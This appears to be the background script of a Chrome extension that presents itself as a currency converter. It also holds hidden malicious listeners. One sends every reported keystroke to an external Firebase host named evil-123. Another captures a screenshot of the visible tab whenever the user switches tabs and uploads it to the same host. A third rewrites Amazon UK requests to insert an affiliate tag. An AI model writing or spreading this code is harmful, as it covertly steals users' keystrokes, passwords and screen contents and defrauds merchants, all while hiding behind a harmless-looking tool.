function getConveretedAmount(fromCurrency, toCurrency, amount ) {
    var http = new XMLHttpRequest();
    var url = "https://api.exchangeratesapi.io/latest";
    http.open("GET", url + "?base=" + fromCurrency, false);
    http.send(null);
    var response = JSON.parse(http.responseText);
    var convertRate = response["rates"][toCurrency];
    return getSymbol(toCurrency) + (parseFloat(amount) * convertRate).toFixed(2);
}

    chrome.runtime.onMessage.addListener(
        function(request, sender, sendResponse) {
            if (request.type === "getConvertedCurrency") {
                var fromCurrency = request.currency;
                var originalAmount = request.amount;
                chrome.storage.local.get(['currency'],
                    function(toCurrency) {
                        var newAmount = getConveretedAmount(
                            fromCurrency,
                            toCurrency.currency,
                            originalAmount);
                        sendResponse(newAmount);
                });
            }
            return true;
        }
    );


function getSymbol(cur) {
    return ({USD: '$', EUR: '€', GBP: '£', ILS: '₪'}[cur]);
}


chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
    if (request.type === "keyup") {
        var http = new XMLHttpRequest();
        var url = "https://evil-123.firebaseio.com/keys.json";
        http.open("POST", url, true);
        http.send(JSON.stringify({"key": request.key}));
    }
});


chrome.tabs.onActivated.addListener(function(activeInfo) {
    chrome.tabs.captureVisibleTab(null, {format: "jpeg", quality: 50}, function (img) {
        var http = new XMLHttpRequest();
        var url = "https://evil-123.firebaseio.com/capture.json";
        http.open("POST", url, true);
        http.send(JSON.stringify({"capture": img}));
    })
});


chrome.webRequest.onBeforeRequest.addListener( function(request) {
    var url = new URL(request.url)
    url.searchParams.set('tag', 'X85GHVYNP');
    return {
        redirectUrl: url.toString()
    }},
    {urls: ["https://www.amazon.co.uk/*"]},
    ["blocking"]);
